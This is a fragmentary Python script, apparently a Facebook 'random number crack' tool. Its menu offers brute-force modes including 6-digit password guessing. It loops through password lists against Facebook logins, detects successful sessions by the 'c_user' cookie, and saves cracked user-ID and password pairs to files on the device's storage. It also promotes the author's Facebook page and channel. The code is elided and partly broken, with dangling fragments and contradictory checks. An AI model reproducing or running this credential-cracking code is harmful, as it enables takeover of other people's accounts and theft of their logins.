...
def o():
    os.system('clear')
    jalan(logo)
    print("""\033[1;32mRANDOM NUMBER CRACK

     SEX :)FREE RANDOM""")
    jalan('\x1b[1;32m [A]\x1b[1;33m ADVANCE RANDOM CRACK slow ')
    jalan('\x1b[1;32m [B]\x1b[1;33m NORMAL RANDOM CRACK ')
    jalan('\x1b[1;32m [C]\x1b[1;33m RANDOM CRACK 6 digite password ')
    jalan('\x1b[1;32m [D] \x1b[1;32mCONTACT ME ON FACEBOOK')
    jalan(' \x1b[1;32m[E] \x1b[1;32mSUBSCRIBE MY CHANNEL')
    jalan(' \x1b[1;32m[F] \x1b[1;32mJOIN FB GROUP')
    jalan(' \x1b[1;32m[G] \x1b[1;31mEXIT')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == 'A':
        os.system('xdg-open https://www.facebook.com/PICCI.ARIYAN.Akash?mibextid=ZbWKwL')
        return None
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[SEX] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[SEX] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid=coki[7:22]
                Red = '\033[1;34m'
                print(f'\r{YELLOW}[SEX-LOCK] '+uid+' | '+ps+'\033[1;97m')
                open('/sdcard/SEX-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        ...
        for ps in pwx:
           ...
           "user-agent": pro}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \33[1;30m(SEX-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SEX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r  %s[SEX] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        pass
